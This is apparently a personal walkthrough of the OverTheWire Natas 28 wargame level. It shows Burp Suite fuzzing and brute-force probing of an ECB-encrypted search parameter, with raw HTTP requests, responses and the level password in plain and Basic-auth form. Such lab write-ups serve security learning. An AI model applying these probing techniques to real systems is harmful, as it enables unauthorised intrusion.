@@ -1,0 +1,1537 @@
+PASSWORD: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+
+ Whack Computer Joke Database
+Search: Computer
+
+URL: http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJigpJxv9DL2tFeWhn127rDiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D  <----------PARAMETER*
+
+Whack Computer Joke Database
+
+    Q: What is a computer virus?
+    A: A terminal illness!
+    A computer lets you make more mistakes faster than any invention in human history - with the possible exceptions of handguns and tequila.
+    Q: How do you tell an introverted computer scientist from an extroverted computer scientist?
+    A: An extroverted computer scientist looks at your shoes when he talks to you.
+
+*COPY PARAMETER*
+
+*BURP SUITE*
+*TOGGLE DECODER*
+*PASTE PARAMETER*
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJigpJxv9DL2tFeWhn127rDiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+*DECODE AS URL*
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJigpJxv9DL2tFeWhn127rDiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
+*DECODE AS BASE64*
+*TOGGLE TEXT*
+è%§º[ýWïFmµÜrÜøu§Ç\òbq¿ÐËÚÑ^ZõÛºÃméøa±gø´®¥×cr2æEÐf{0£  <----------THERE IS AN ECRYPTION*
+
+*BURP SUITE*
+*TOGGLE HTTP HISTORY*
+http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJigpJxv9DL2tFeWhn127rDiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+*SEND TO INTRUDER*
+*TOGGLE INTRUDER*
+*CLEAR$*
+*ADD$ PARAMETER*
+GET /search.php/?query=§G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJigpJxv9DL2tFeWhn127rDiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D§ HTTP/1.1
+Host: natas28.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyODoxSk53UU0xT2k2SjZqMWs0OVh5dzdaTjZwWE1RSW5Wag==
+Connection: close
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097
+Upgrade-Insecure-Requests: 1
+
+*WEB BROWSER GITHUB SEARCH: SECLISTS*
+URL: https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt
+*FOR SPECIAL CHARACTERS*
+*COPY RAW FILE
+
+*TOGGLE PAYLOADS
+*PAYLOAD SET 1 
+*PAYLOAD TYPE SIMPLE LIST
+*PAYLOAD SETTINGS
+*PRESS CLEAR
+*PRESS PASTE - RAW FILE - FOR SPECIAL CHARACTERS*
+*START ATTACK*
+
+*0 IS DEFAULT PAYLOAD*  <---------NON-RELEVANT
+*1 - 32 = Zero padding found instead of PKCS#7 padding*
+*RIGHT CLICK RESPONSE*
+*SHOW RESPONSE IN BROWSER*
+*COPY AND PASTE IN WEB BROWSER*
+URL: http://natas28.natas.labs.overthewire.org/search.php/?query=%3e
+Notice: Uninitialized string offset: -1 in /var/www/natas/natas28/search.php on line 59
+Zero padding found instead of PKCS#7 padding
+
+*NEEDS PADDING IN BLOCK CIPHERS - ECB (Electronic Code Book)*
+
+*BURP SUITE*
+*TOGGLE PROXY*
+*TOGGLE INTERCEPT IS ON*
+
+*WEB BROWSER*
+URL: http://natas28.natas.labs.overthewire.org/
+ Whack Computer Joke Database
+Search: Computer
+*SEARCH*
+
+*BURP SUITE*
+*SEND TO INTRUDER*
+*TOGGLE INTERCEPT IS OFF*
+*TOGGLE INTRUDER*
+*CLEAR$*
+*ADD$ YOUR QUERY*
+POST /index.php HTTP/1.1
+Host: natas28.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+Origin: http://natas28.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyODoxSk53UU0xT2k2SjZqMWs0OVh5dzdaTjZwWE1RSW5Wag==
+Connection: close
+Referer: http://natas28.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097
+Upgrade-Insecure-Requests: 1
+
+query=§Computer§
+
+*TOGGLE PAYLOADS
+*PAYLOAD SET 1 
+*PAYLOAD TYPE BRUTE FORCER
+*PAYLOAD SETTINGS
+CHARACTER SET: A
+MIN LENGTH: 1
+MAX LENGTH: 60
+*START ATTACK*
+
+*SAVE ATTACK - SERVER RESPONSES*
+*TERMINAL*
+┌──(ra6narok㉿kali)-[~/Desktop/Natas/natas28]
+└─$ ls
+0   12  16  2   23  27  30  34  38  41  45  49  52  56  6   9
+1   13  17  20  24  28  31  35  39  42  46  5   53  57  60
+10  14  18  21  25  29  32  36  4   43  47  50  54  58  7
+11  15  19  22  26  3   33  37  40  44  48  51  55  59  8
+
+                                                                                
+┌──(ra6narok㉿kali)-[~/Desktop/Natas/natas28]
+└─$ ls -la
+total 252
+drwxr-xr-x 2 ra6narok ra6narok 4096 Jun 14 06:00 .
+drwxr-xr-x 3 musxl musxl 4096 Jun 14 05:59 ..
+-rw-r--r-- 1 musxl musxl 1282 Jun 14 06:00 0
+-rw-r--r-- 1 musxl musxl 1278 Jun 14 06:00 1
+-rw-r--r-- 1 musxl musxl 1277 Jun 14 06:00 10
+-rw-r--r-- 1 musxl musxl 1277 Jun 14 06:00 11
+-rw-r--r-- 1 musxl musxl 1277 Jun 14 06:00 12
+-rw-r--r-- 1 musxl musxl 1293 Jun 14 06:00 13
+-rw-r--r-- 1 musxl musxl 1293 Jun 14 06:00 14
+-rw-r--r-- 1 musxl musxl 1293 Jun 14 06:00 15
+-rw-r--r-- 1 musxl musxl 1303 Jun 14 06:00 16
+-rw-r--r-- 1 musxl musxl 1295 Jun 14 06:00 17
+-rw-r--r-- 1 musxl musxl 1297 Jun 14 06:00 18
+-rw-r--r-- 1 musxl musxl 1297 Jun 14 06:00 19
+-rw-r--r-- 1 musxl musxl 1278 Jun 14 06:00 2
+-rw-r--r-- 1 musxl musxl 1295 Jun 14 06:00 20
+-rw-r--r-- 1 musxl musxl 1293 Jun 14 06:00 21
+-rw-r--r-- 1 musxl musxl 1299 Jun 14 06:00 22
+-rw-r--r-- 1 musxl musxl 1297 Jun 14 06:00 23
+-rw-r--r-- 1 musxl musxl 1297 Jun 14 06:00 24
+-rw-r--r-- 1 musxl musxl 1299 Jun 14 06:00 25
+-rw-r--r-- 1 musxl musxl 1297 Jun 14 06:00 26
+-rw-r--r-- 1 musxl musxl 1297 Jun 14 06:00 27
+-rw-r--r-- 1 musxl musxl 1299 Jun 14 06:00 28
+-rw-r--r-- 1 musxl musxl 1327 Jun 14 06:00 29
+-rw-r--r-- 1 musxl musxl 1278 Jun 14 06:00 3
+-rw-r--r-- 1 musxl musxl 1329 Jun 14 06:00 30
+-rw-r--r-- 1 musxl musxl 1327 Jun 14 06:00 31
+-rw-r--r-- 1 musxl musxl 1331 Jun 14 06:00 32
+-rw-r--r-- 1 musxl musxl 1327 Jun 14 06:00 33
+-rw-r--r-- 1 musxl musxl 1325 Jun 14 06:00 34
+-rw-r--r-- 1 musxl musxl 1329 Jun 14 06:00 35
+-rw-r--r-- 1 musxl musxl 1325 Jun 14 06:00 36
+-rw-r--r-- 1 musxl musxl 1327 Jun 14 06:00 37
+-rw-r--r-- 1 musxl musxl 1329 Jun 14 06:00 38
+-rw-r--r-- 1 musxl musxl 1329 Jun 14 06:00 39
+-rw-r--r-- 1 musxl musxl 1278 Jun 14 06:00 4
+-rw-r--r-- 1 musxl musxl 1327 Jun 14 06:00 40
+-rw-r--r-- 1 musxl musxl 1331 Jun 14 06:00 41
+-rw-r--r-- 1 musxl musxl 1327 Jun 14 06:00 42
+-rw-r--r-- 1 musxl musxl 1325 Jun 14 06:00 43
+-rw-r--r-- 1 musxl musxl 1325 Jun 14 06:00 44
+-rw-r--r-- 1 musxl musxl 1349 Jun 14 06:00 45
+-rw-r--r-- 1 musxl musxl 1343 Jun 14 06:00 46
+-rw-r--r-- 1 musxl musxl 1347 Jun 14 06:00 47
+-rw-r--r-- 1 musxl musxl 1351 Jun 14 06:00 48
+-rw-r--r-- 1 musxl musxl 1347 Jun 14 06:00 49
+-rw-r--r-- 1 musxl musxl 1280 Jun 14 06:00 5
+-rw-r--r-- 1 musxl musxl 1345 Jun 14 06:00 50
+-rw-r--r-- 1 musxl musxl 1347 Jun 14 06:00 51
+-rw-r--r-- 1 musxl musxl 1345 Jun 14 06:00 52
+-rw-r--r-- 1 musxl musxl 1345 Jun 14 06:00 53
+-rw-r--r-- 1 musxl musxl 1345 Jun 14 06:00 54
+-rw-r--r-- 1 musxl musxl 1349 Jun 14 06:00 55
+-rw-r--r-- 1 musxl musxl 1349 Jun 14 06:00 56
+-rw-r--r-- 1 musxl musxl 1347 Jun 14 06:00 57
+-rw-r--r-- 1 musxl musxl 1347 Jun 14 06:00 58
+-rw-r--r-- 1 musxl musxl 1347 Jun 14 06:00 59
+-rw-r--r-- 1 musxl musxl 1278 Jun 14 06:00 6
+-rw-r--r-- 1 musxl musxl 1347 Jun 14 06:00 60
+-rw-r--r-- 1 musxl musxl 1282 Jun 14 06:00 7
+-rw-r--r-- 1 musxl musxl 1282 Jun 14 06:00 8
+-rw-r--r-- 1 musxl musxl 1280 Jun 14 06:00 9
+
+┌──(ra6narok㉿kali)-[~/Desktop/Natas/natas28]
+└─$ cat 0      
+HTTP/1.1 302 Found
+Date: Fri, 14 Jun 2024 09:52:55 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJigpJxv9DL2tFeWhn127rDiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+Content-Length: 920
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas28", "pass": "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" };</script></head>
+<body>
+<!--
+    morla/10111
+    y0 n0th!
+-->
+<h1>natas28</h1>
+<div id="content">
+
+<div id="viewsource">sorry, we are currently out of sauce</div>
+</div>
+</body>
+</html>
+
+*HIGHLIGHT LOCATION FROM CAT 0*
+
+┌──(ra6narok㉿kali)-[~/Desktop/Natas/natas28]
+└─$ grep -a Location *                                
+0:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJigpJxv9DL2tFeWhn127rDiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+1:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
+2:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKYsNYgsg1hFJebd%2BJNix06SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
+3:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ8EmoxKU1njKubmw7%2BRDt1mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+4:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK02918sQNUadassvlSAHDHKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
+5:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJLk0xdEarIh%2BMvTkV61TlvrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+6:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ%2BDZedSJQqwrZX9tfUGM7WQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
+7:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKvwmKMYUAmbbaAruK1epuIZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
+8:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLNQ6RxZsY7UPRe5yiycfUiiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+9:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKIFsYeK8Y3JmD4ecRfI3d%2BoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
+10:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
+11:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyNjNpR93%2FBz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo%3D
+12:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyh1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt%2Fc0tByJk%3D
+13:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyxkduQZYZ04f0V3MSJfFf4WIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
+14:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy8E3OxOtrwX6aLupZE7rN8kJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
+15:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyBCVa4WFY0V3lE8rdLRyW4qdz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
+16:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy4982HGOTYZrHs%2BnQl7ERrqd%2BjtGqvgtdBcT%2F5qwUI6tHjrGh%2FiYaLGwVBhEJs%2F7a
+17:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyzWmcbPL7fl9D3iEG3blOYr36EFTsaFFc%2BW8qVURZGUeQT0sqvywtdoaqcqUxUclw
+18:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyp7SJW%2Ff7tx3AmzQXc4%2FWeEh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
+19:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyhwCRNj7%2FkSX2mM0u1Qv9KJouK1228x8ZoU91Z46tqpBCSbk%2BTeoJCUeZlbnESzUa
+20:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy5wrwtg4yc%2FS3kXfVkDZZTCkofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
+21:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyzjyIMCFvQOsVmZpQmxtr8qw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
+22:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyRi%2Fs%2BIS1Qx9tuPPY1kKMAEHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK
+23:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyjlnHzG96QjknSLUwAU4SX2SGlUrqRvuT6auFhFtPS9DX%2FytyVFP8KUcB5R9dfA%2BO
+24:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyhYFrQ%2BkyJH9pdrZDsBjKV4lt6QiE%2BGEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
+25:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9WBUJHTJsGAxtf2jb2h6z6CVIvMBz502rHAj8WWUjFqXOc2QUi%2BnqG%2BVdztW%2BfjA
+26:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK3OKX%2FtKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
+27:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJKzYzaUfd%2Fwc9EywiOR5lUQjKjPTmEJE6uuOaBnYZIEpa
+28:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK4dSfUN3M5jG7x8RSlE6ACh1%2FVBE%2FQY9Jva7f3NLQciZ
+29:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK8ZHbkGWGdOH9FdzEiXxX%2BFiI6FNnEKRuYd1sD%2B8c9Tt2K5R19pxsrCD2Rmg17iLmA%3D%3D
+30:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FBNzsTra8F%2Bmi7qWRO6zfJCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4%2FemDU2A%3D%3D
+31:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJKwQlWuFhWNFd5RPK3S0cluKnc%2FMYUJSqAUCPH5fQN9OFZ4xXc%2BzCj4cOT068bIBwpA%3D%3D
+32:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2BPfNhxjk2Gax7Pp0JexEa6nfo7Rqr4LXQXE%2F%2BasFCOrR46xof4mGixsFQYRCbP%2B2g%3D%3D
+33:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK81pnGzy%2B35fQ94hBt25TmK9%2BhBU7GhRXPlvKlVEWRlHkE9LKr8sLXaGqnKlMVHJcA%3D%3D
+34:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK6e0iVv3%2B7cdwJs0F3OP1nhIeZoHsdKbWYIBXJNVwuAOre2b26ympztxs1oBDSxMVw%3D%3D
+35:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK4cAkTY%2B%2F5El9pjNLtUL%2FSiaLitdtvMfGaFPdWeOraqQQkm5Pk3qCQlHmZW5xEs1Gg%3D%3D
+36:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2BcK8LYOMnP0t5F31ZA2WUwpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
+37:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK848iDAhb0DrFZmaUJsba%2FKsO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF%2Bon86ew%3D%3D
+38:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK0Yv7PiEtUMfbbjz2NZCjABBwJjEus3F7ZNXVk5RBd1%2BZNDcyGglNpKt%2FL03ltG%2Fig%3D%3D
+39:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK45Zx8xvekI5J0i1MAFOEl9khpVK6kb7k%2BmrhYRbT0vQ1%2F8rclRT%2FClHAeUfXXwPjg%3D%3D
+40:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK4WBa0PpMiR%2FaXa2Q7AYyleJbekIhPhhCLFn%2BLSupddjkXIyBRSD5o5Fj9BmFnswow%3D%3D
+41:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FVgVCR0ybBgMbX9o29oes%2BglSLzAc%2BdNqxwI%2FFllIxalznNkFIvp6hvlXc7Vvn4wA%3D%3D
+42:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxyStzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
+43:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySs2M2lH3f8HPRMsIjkeZVEIyoz05hCROrrjmgZ2GSBKWg%3D%3D
+44:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuHUn1DdzOYxu8fEUpROgAodf1QRP0GPSb2u39zS0HImQ%3D%3D
+45:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvGR25BlhnTh%2FRXcxIl8V%2FhYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D
+46:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvwTc7E62vBfpou6lkTus3yQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
+47:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySsEJVrhYVjRXeUTyt0tHJbip3PzGFCUqgFAjx%2BX0DfThWeMV3Pswo%2BHDk9OvGyAcKQ%3D
+48:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvj3zYcY5Nhmsez6dCXsRGup36O0aq%2BC10FxP%2FmrBQjq0eOsaH%2BJhosbBUGEQmz%2Fto%3D
+49:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvNaZxs8vt%2BX0PeIQbduU5ivfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
+50:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuntIlb9%2Fu3HcCbNBdzj9Z4SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
+51:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySuHAJE2Pv%2BRJfaYzS7VC%2F0omi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+52:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvnCvC2DjJz9LeRd9WQNllMKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
+53:Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF%2BGYia4Y4FxErHJK%2FYz5rBfhmImuGOBcRKxySvOPIgwIW9A6xWZmlCbG2vyrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
